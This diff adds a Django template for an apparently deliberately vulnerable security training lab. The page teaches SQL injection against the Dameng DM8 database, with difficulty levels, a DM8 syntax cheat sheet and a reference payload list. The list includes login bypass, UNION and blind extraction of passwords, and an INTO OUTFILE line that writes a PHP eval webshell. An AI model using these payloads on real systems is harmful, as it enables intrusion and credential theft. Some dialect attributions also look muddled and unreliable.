@@ -1,0 +1,117 @@
+{% extends "base.html" %}
+{% block title %}SQL 注入 - XinRange{% endblock %}
+
+{% block content %}
+<a href="/" class="back-link">← 返回首页</a>
+
+<div class="card">
+    <div class="card-title">💉 SQL 注入 — 达梦 DM8 方言</div>
+    <div class="card-desc">
+        漏洞原理：用户输入未经充分过滤直接拼接入 SQL 语句，攻击者可通过构造恶意输入执行任意SQL命令。<br>
+        达梦 DM8 与 MySQL 在语法上有差异（如自增用 <code>IDENTITY</code> 而非 AUTO_INCREMENT），本模块结合这些差异进行演示。
+    </div>
+</div>
+
+<!-- 难度选择 -->
+<div class="difficulty-bar">
+    <span>难度：</span>
+    <a href="?level=low"><button class="diff-btn low {% if difficulty == 'low' %}active{% endif %}">🔵 Low</button></a>
+    <a href="?level=medium"><button class="diff-btn medium {% if difficulty == 'medium' %}active{% endif %}">🟡 Medium</button></a>
+    <a href="?level=high"><button class="diff-btn high {% if difficulty == 'high' %}active{% endif %}">🔴 High</button></a>
+    &nbsp;&nbsp;|&nbsp;&nbsp;
+    <a href="/vulns/sqli/login/?level={{ difficulty }}"><button class="diff-btn">登录绕过</button></a>
+</div>
+
+<!-- 漏洞演示区 -->
+<div class="card">
+    <div class="card-title">文章搜索（漏洞入口）</div>
+    <form method="get" action="/vulns/sqli/search/">
+        <input type="hidden" name="level" value="{{ difficulty }}">
+        <div style="display:flex;gap:10px;">
+            <input type="text" name="q" placeholder="输入关键词搜索文章..." value="{{ query|default:'' }}">
+            <button type="submit" class="btn btn-primary">搜索</button>
+        </div>
+    </form>
+
+    {% if results %}
+    <div style="margin-top:16px;">
+        <strong style="font-size:13px;color:var(--muted);">搜索结果 ({{ results|length }} 条)：</strong>
+        <table style="margin-top:8px;">
+            <thead><tr><th>ID</th><th>标题</th><th>作者</th><th>时间</th></tr></thead>
+            <tbody>
+            {% for r in results %}
+            <tr>
+                <td>{{ r.id }}</td>
+                <td>{{ r.title }}</td>
+                <td>{{ r.author }}</td>
+                <td>{{ r.created_at|default:'-' }}</td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    {% elif query %}
+    <div class="alert alert-warn">未找到相关结果，尝试注入 Payload 吧。</div>
+    {% endif %}
+
+    {% if raw_sql %}
+    <div class="alert alert-danger" style="margin-top:16px;">
+        <strong>⚠️ 当前难度存在漏洞，后端执行了以下 SQL：</strong><br>
+        <pre>{{ raw_sql }}</pre>
+        <div style="margin-top:8px;font-size:12px;">提示：尝试在搜索框输入 <code>' OR '1'='1</code> 或 <code>' UNION SELECT 1,2,3,4--</code></div>
+    </div>
+    {% elif difficulty == 'high' %}
+    <div class="alert alert-success" style="margin-top:16px;">
+        ✅ 当前使用参数化查询，SQL 注入无效。尝试绕过登录看看？
+    </div>
+    {% endif %}
+</div>
+
+<!-- 达梦方言提示 -->
+<div class="card">
+    <div class="card-title">达梦 DM8 注入技巧提示</div>
+    <div class="card-desc">
+        <table>
+            <thead><tr><th>场景</th><th>MySQL 写法</th><th>达梦 DM8 写法</th></tr></thead>
+            <tbody>
+            <tr><td>联合查询常量</td><td><code> UNION SELECT 1,2,3,4--</code></td><td><code> UNION SELECT 1,2,3,4 FROM DUAL--</code></td></tr>
+            <tr><td>获取版本</td><td><code>SELECT @@version</code></td><td><code>SELECT * FROM V$INSTANCE</code></td></tr>
+            <tr><td>获取当前用户</td><td><code>SELECT user()</code></td><td><code>SELECT CURRENT_USER FROM DUAL</code></td></tr>
+            <tr><td>猜解列数</td><td><code>ORDER BY 3</code></td><td>通用（达梦兼容）</td></tr>
+            <tr><td>时间盲注</td><td><code>SLEEP(5)</code></td><td><code>SELECT SLEEP(5) FROM DUAL</code></td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- 参考 Payload -->
+<div class="card">
+    <div class="card-title">Low/Medium 难度参考 Payload</div>
+    <div class="card-desc">
+        <pre># 绕过登录（万能钥匙）
+' OR '1'='1
+admin' OR '1'='1'--
+
+# 联合注入 - 猜列数
+' ORDER BY 3--
+' ORDER BY 4--  (若报错则是3列)
+
+# 联合查询
+' UNION SELECT 1,2,3,4 FROM DUAL--
+' UNION SELECT 1,user(),db_name(),4 FROM DUAL--
+
+# 报错注入
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+# 达梦报错:
+' AND 1=GTID_SUBSET(@@version,0)--
+
+# 布尔盲注
+' AND 1=1--
+' AND 1=2--  (返回不同结果)
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM sqli_users),1,1))>64--
+
+# 写入文件（需权限）
+' UNION SELECT 1,2,'&lt;?php eval($_POST[cmd]); ?&gt;' INTO OUTFILE '/tmp/shell.php'--</pre>
+    </div>
+</div>
+{% endblock %}
